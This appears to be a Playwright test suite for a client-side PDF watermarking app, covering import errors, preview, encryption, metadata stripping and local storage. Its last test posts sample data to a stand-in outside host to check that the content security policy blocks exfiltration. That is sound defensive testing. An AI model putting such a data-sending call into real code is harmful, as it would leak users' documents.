import { mkdir, readFile, writeFile } from "node:fs/promises";
import path from "node:path";
import { expect, test, type Locator, type Page } from "@playwright/test";
import { unzipSync } from "fflate";
import {
  OUTPUT_DIR,
  SECRET_NAME,
  encryptedPdf,
  multiPagePdf,
  sampleImages,
  writeFixture,
} from "./fixtures";
import { inspectPdf, requiresPassword } from "./pdf-inspect";

const PASSWORD = "k7Rm-2pXq-9vTz-Lh4w";
const METADATA_KEYS = ["Title", "Author", "Creator", "Producer", "CreationDate", "ModDate"];

test.describe.configure({ mode: "serial" });

let page: Page;
const foreignRequests: string[] = [];
const workerUrls: string[] = [];

function docItem(name: string): Locator {
  return page.getByTestId("doc-item").filter({ hasText: name });
}

async function previewSignature(): Promise<string> {
  return page.getByTestId("preview-canvas").evaluate((node) => {
    const canvas = node as HTMLCanvasElement;
    const ctx = canvas.getContext("2d");
    if (!ctx || canvas.width === 0) return "vide";
    const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
    let hash = 0;
    for (let i = 0; i < data.length; i += 101) hash = (hash * 31 + data[i]) >>> 0;
    return `${canvas.width}x${canvas.height}:${hash}`;
  });
}

async function download(trigger: Locator): Promise<{ name: string; bytes: Uint8Array }> {
  const [event] = await Promise.all([page.waitForEvent("download"), trigger.click()]);
  await mkdir(OUTPUT_DIR, { recursive: true });
  const file = path.join(OUTPUT_DIR, event.suggestedFilename());
  await event.saveAs(file);
  return { name: event.suggestedFilename(), bytes: new Uint8Array(await readFile(file)) };
}

test.beforeAll(async ({ browser, baseURL }) => {
  page = await browser.newPage();
  page.on("worker", (worker) => workerUrls.push(worker.url()));
  page.on("request", (request) => {
    const url = request.url();
    if (!url.startsWith(baseURL ?? "") && !url.startsWith("data:") && !url.startsWith("blob:")) {
      foreignRequests.push(url);
    }
  });
  await page.goto("/");
});

test.afterAll(async () => {
  await page?.close();
});

test("import multiple : PDF multi-pages, images et erreurs explicites", async () => {
  await expect(page.getByTestId("privacy-banner")).toContainText("ne quittent jamais ce navigateur");

  const images = await sampleImages(page);
  const bigFile = await writeFixture("trop-gros.pdf", Buffer.alloc(51 * 1024 * 1024, 0x25));
  const files = [
    await writeFixture("multipage.pdf", await multiPagePdf()),
    await writeFixture("photo-cni.jpg", images.jpeg),
    await writeFixture("rib-scan.png", images.png),
    await writeFixture("fiche-paie-protegee.pdf", await encryptedPdf("secret")),
    await writeFixture("restreint.pdf", await encryptedPdf("")),
    await writeFixture("corrompu.pdf", "%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R >>\ngarbage"),
    await writeFixture("faux.pdf", "Ceci n'est pas un PDF"),
    await writeFixture("notes.txt", "texte"),
    bigFile,
  ];
  await page.getByTestId("file-input").setInputFiles(files);

  await expect(page.getByTestId("doc-item")).toHaveCount(files.length);
  await expect(page.locator('[data-testid="doc-item"][data-status="loading"]')).toHaveCount(0, { timeout: 60_000 });

  await expect(docItem("multipage.pdf")).toContainText("4 pages");
  await expect(docItem("photo-cni.jpg")).toContainText("1 page · ");
  await expect(docItem("photo-cni.jpg")).toContainText("image convertie en A4");
  await expect(docItem("rib-scan.png")).toContainText("1 page");
  await expect(docItem("fiche-paie-protegee.pdf")).toContainText("PDF protégé par mot de passe");
  await expect(docItem("corrompu.pdf")).toContainText("PDF corrompu ou illisible");
  await expect(docItem("faux.pdf")).toContainText("PDF corrompu ou illisible");
  await expect(docItem("notes.txt")).toContainText("Format non supporté");
  await expect(docItem("trop-gros.pdf")).toContainText("Fichier trop volumineux");
});

test("aperçu de la première page, mis à jour en direct", async () => {
  const canvas = page.getByTestId("preview-canvas");
  await expect(canvas).toBeVisible({ timeout: 30_000 });
  await expect.poll(previewSignature).not.toBe("vide");
  const initial = await previewSignature();

  await page.getByTestId("opacity").fill("80");
  await expect.poll(previewSignature).not.toBe(initial);
  const afterOpacity = await previewSignature();

  await page.getByRole("button", { name: "Transmission nominative" }).click();
  await page.getByTestId("var-destinataire").fill("M. Martin");
  await page.getByTestId("var-objet").fill("location du T2");
  await page.getByTestId("var-date").fill("2026-09-14");
  await expect.poll(previewSignature).not.toBe(afterOpacity);

  await page.getByTestId("angle").fill("30");
  await page.getByTestId("angle").fill("45");
  await page.screenshot({ path: path.join(OUTPUT_DIR, "interface.png") });

  // Aperçu d'une image importée
  await docItem("photo-cni.jpg").getByRole("button").first().click();
  await expect(page.getByText("photo-cni.jpg · page 1")).toBeVisible();
  await expect.poll(previewSignature).not.toBe("vide");
});

test("aplati + mot de passe : ZIP téléchargé, PDF chiffrés, sans texte ni métadonnées", async () => {
  await page.getByTestId("dpi-150").click();
  await page.getByTestId("password-toggle").click();
  await page.getByTestId("password-input").fill(PASSWORD);
  await expect(page.getByTestId("password-strength")).toContainText(/Fort|Très fort/);

  await page.getByTestId("generate").click();
  await expect(page.getByRole("progressbar")).toBeVisible();
  const summary = page.getByTestId("job-summary");
  await expect(summary).toBeVisible({ timeout: 120_000 });
  await expect(summary).toContainText("4 documents filigranés, protégés par mot de passe");

  // L'assemblage PDF doit tourner dans le Web Worker compilé (pas en repli sur le thread principal).
  const appWorkers = workerUrls.filter((url) => !url.includes("/pdfjs/"));
  expect(appWorkers.length, `workers vus : ${workerUrls.join(", ")}`).toBeGreaterThan(0);
  expect(appWorkers.every((url) => !url.endsWith(".ts"))).toBe(true);

  const zip = await download(page.getByTestId("download-all"));
  expect(zip.name).toMatch(/^documents_filigranes_\d{4}-\d{2}-\d{2}\.zip$/);
  const entries = unzipSync(zip.bytes);
  expect(Object.keys(entries).sort()).toEqual([
    "multipage_filigrane.pdf",
    "photo-cni_filigrane.pdf",
    "restreint_filigrane.pdf",
    "rib-scan_filigrane.pdf",
  ]);

  for (const [name, bytes] of Object.entries(entries)) {
    await writeFile(path.join(OUTPUT_DIR, `aplati-chiffre_${name}`), bytes);
    expect(await requiresPassword(bytes), `${name} doit exiger le mot de passe`).toBe(true);
    const pdf = await inspectPdf(bytes, PASSWORD);
    expect(pdf.pageText.join(""), `${name} : aucun texte extractible après aplatissement`).toBe("");
    for (const key of METADATA_KEYS) expect(pdf.info[key], `${name} : métadonnée ${key}`).toBeUndefined();
    expect(pdf.hasXmp).toBe(false);
  }

  const multi = await inspectPdf(entries["multipage_filigrane.pdf"], PASSWORD);
  expect(multi.pageCount).toBe(4);
  expect(multi.pageSizes).toEqual([
    { width: 595, height: 842 },
    { width: 842, height: 595 },
    { width: 842, height: 595 }, // page tournée : dimensions telles qu'affichées
    { width: 595, height: 842 },
  ]);
  const photo = await inspectPdf(entries["photo-cni_filigrane.pdf"], PASSWORD);
  expect(photo.pageSizes).toEqual([{ width: 842, height: 595 }]); // A4 paysage
  const scan = await inspectPdf(entries["rib-scan_filigrane.pdf"], PASSWORD);
  expect(scan.pageSizes).toEqual([{ width: 595, height: 842 }]); // A4 portrait
});

test("vectoriel sans mot de passe : texte conservé, filigrane sur toutes les pages", async () => {
  await page.getByTestId("password-toggle").click();
  await page.getByTestId("flatten-toggle").click();
  await expect(docItem("multipage.pdf")).toContainText("Réglages modifiés — à régénérer");

  await page.getByTestId("generate").click();
  const summary = page.getByTestId("job-summary");
  await expect(summary).toContainText("3 documents filigranés", { timeout: 120_000 });
  await expect(summary).toContainText("restreint.pdf : Ce PDF comporte des restrictions de sécurité");

  const { name, bytes } = await download(docItem("multipage.pdf").getByRole("button", { name: /Télécharger/ }));
  expect(name).toBe("multipage_filigrane.pdf");
  expect(await requiresPassword(bytes)).toBe(false);

  const pdf = await inspectPdf(bytes);
  expect(pdf.pageCount).toBe(4);
  for (const key of METADATA_KEYS) expect(pdf.info[key], `métadonnée ${key}`).toBeUndefined();
  expect(pdf.hasXmp).toBe(false);

  const expectedLine = "Transmis à M. Martin le 14/09/2026";
  pdf.pageText.forEach((text, i) => {
    expect(text, `page ${i + 1} : texte d'origine`).toContain(SECRET_NAME);
    expect(text, `page ${i + 1} : filigrane`).toContain(expectedLine);
    expect(text, `page ${i + 1} : 2e ligne`).toContain("usage strictement limité à location du T2");
  });

  // Le lecteur doit voir l'angle choisi (45°) sur chaque page, y compris la page /Rotate 90.
  pdf.pageRuns.forEach((runs, i) => {
    const angles = new Set(runs.filter((r) => r.str.includes("Transmis")).map((r) => r.angle));
    expect([...angles], `page ${i + 1} : angle affiché`).toEqual([45]);
  });

  // Page 4 : le « cm » non restauré du document ne doit pas réduire la mosaïque dans un coin.
  const xs = pdf.pageRuns[3].filter((r) => r.str.includes("Transmis")).map((r) => r.x);
  const ys = pdf.pageRuns[3].filter((r) => r.str.includes("Transmis")).map((r) => r.y);
  expect(xs.length).toBeGreaterThan(5);
  expect(Math.max(...xs) - Math.min(...xs)).toBeGreaterThan(400);
  expect(Math.max(...ys) - Math.min(...ys)).toBeGreaterThan(600);
});

test("modèle personnalisé : seuls les réglages sont stockés", async () => {
  await page.getByTestId("font-size").fill("30");
  await page.getByRole("button", { name: "Enregistrer ces réglages comme modèle" }).click();
  await expect(page.getByRole("button", { name: "★ Mon modèle" })).toBeVisible();

  const stored = await page.evaluate(() => {
    const result: Record<string, string> = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) result[key] = localStorage.getItem(key) ?? "";
    }
    return result;
  });
  const values = Object.values(stored).join("\n");
  expect(Object.keys(stored)).toEqual(["filigrane:modele-personnalise:v1"]);
  expect(values).not.toContain("M. Martin");
  expect(values).not.toContain("location du T2");
  expect(values).not.toContain(SECRET_NAME);
  const parsed = JSON.parse(values) as { style: { fontSize: number }; flatten: boolean };
  expect(parsed.style.fontSize).toBe(30);
  expect(parsed.flatten).toBe(false);

  await page.reload();
  await page.getByRole("button", { name: "★ Mon modèle" }).click();
  await expect(page.getByTestId("font-size")).toHaveValue("30");
  await expect(page.getByTestId("doc-item")).toHaveCount(0); // les documents ne survivent pas au rechargement
});

test("aucune requête vers l'extérieur, et la CSP bloque toute tentative", async () => {
  const blocked = await page.evaluate(async () => {
    try {
      await fetch("https://example.com/collecte", { method: "POST", body: "donnees" });
      return false;
    } catch {
      return true;
    }
  });
  expect(blocked).toBe(true);
  expect(foreignRequests.filter((url) => !url.startsWith("https://example.com"))).toEqual([]);
});
